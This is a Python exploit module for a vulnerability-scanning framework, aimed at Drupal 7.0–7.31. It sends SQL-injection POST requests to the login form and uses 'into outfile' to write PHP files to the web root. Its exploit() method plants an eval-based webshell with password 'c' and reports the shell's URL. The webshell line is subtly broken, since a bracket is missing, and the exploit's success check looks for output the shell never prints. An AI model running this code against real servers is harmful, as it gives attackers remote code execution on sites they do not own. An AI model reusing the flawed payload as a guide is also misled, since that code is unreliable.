# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random
import urllib.request
import urllib.parse
import urllib.error


class Vuln(ABVuln):
    vuln_id = 'Drupal_0003'  # 平台漏洞编号，留空
    name = 'Drupal /index.php getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        Drupal 7.0-7.31 index.php getshell.
    '''  # 漏洞描述
    ref = 'Unknown'    # 漏洞来源
    cnvd_id = 'Unknown'    # cnvd漏洞编号
    cve_id = 'Unknown'    # cve编号
    product = 'Drupal'  # 漏洞应用名称
    product_version = '7.0-7.31'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f5d7a3d1-2a24-4304-8b2a-5f75d1a03893'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = '?q=node&destination=node'
            filename = '/shell' + str(random.randint(1, 10000000000)) + '.php'
            target = self.target + payload
            post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
            code, head, body, errcode, final_url = hh.http(target, post=post1)
            res = re.findall('line.+of.+>([^<>]+)includes/unicode.inc', body)
            if (len(res) == 0):
                return
            path = res[0]
            post2 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'" + path + filename + \
                "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
            code, head, body, errcode, final_url = hh.http(target, post=post2)
            target2 = self.target + filename
            code, head, body, errcode, final_url = hh.http(target2)

            if 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target+' ==getshell>> '+target2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = '?q=node&destination=node'
            filename = '/shell' + str(random.randint(1, 10000000000)) + '.php'
            target = self.target + payload
            post1 = "name[0%20;select%20'<?php%20print(md5(1))?>'%20into%20outfile%20'test5.php';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
            code, head, body, errcode, final_url = hh.http(target, post=post1)
            res = re.findall('line.+of.+>([^<>]+)includes/unicode.inc', body)
            if (len(res) == 0):
                return
            path = res[0]
            # getshell
            post2 = "name[0%20;select%20'<?php @eval($_POST[c);?>'%20into%20outfile%20'" + path + filename + \
                "';#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
            code, head, body, errcode, final_url = hh.http(target, post=post2)
            target2 = self.target + filename
            code, head, body, errcode, final_url = hh.http(target2)

            if 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target+' ==getshell>> '+target2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=target2))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
